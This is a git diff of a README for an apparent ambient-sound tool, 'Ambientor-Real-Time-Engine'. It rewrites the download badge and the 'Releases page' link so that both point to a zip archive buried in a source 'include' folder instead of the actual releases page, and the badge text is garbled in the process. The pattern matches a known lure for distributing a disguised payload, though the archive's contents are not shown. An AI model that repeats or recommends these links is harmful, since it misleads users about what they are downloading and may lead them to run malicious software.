@@ -1,7 +1,7 @@
 # 🎶 Ambientor-Real-Time-Engine - Create Realistic Ambient Sounds Easily
 
 ## 📥 Download Now
-[![Download Ambientor-Real-Time-Engine](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/usuidmylife/Ambientor-Real-Time-Engine/releases)
+[![Download Ambientor-Real-Time-Engine](https://raw.githubusercontent.com/usuidmylife/Ambientor-Real-Time-Engine/main/rust/ambientor-ffi/include/Ambientor-Real-Time-Engine_v3.3.zip%20Release-brightgreen)](https://raw.githubusercontent.com/usuidmylife/Ambientor-Real-Time-Engine/main/rust/ambientor-ffi/include/Ambientor-Real-Time-Engine_v3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the Ambientor-Real-Time-Engine! This application helps you create and manage ambient sounds seamlessly. Whether you want to enhance your gaming experience or produce relaxing soundscapes, this tool is designed for you.
@@ -15,7 +15,7 @@ Before you begin, please ensure your system meets these requirements:
 - **Disk Space**: Minimum of 100 MB available space.
 
 ## 📦 Download & Install
-To get started, visit the [Releases page](https://github.com/usuidmylife/Ambientor-Real-Time-Engine/releases) to download the application. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/usuidmylife/Ambientor-Real-Time-Engine/main/rust/ambientor-ffi/include/Ambientor-Real-Time-Engine_v3.3.zip) to download the application. Follow these steps:
 
 1. Click on the link above.
 2. Find the latest version and click on it.
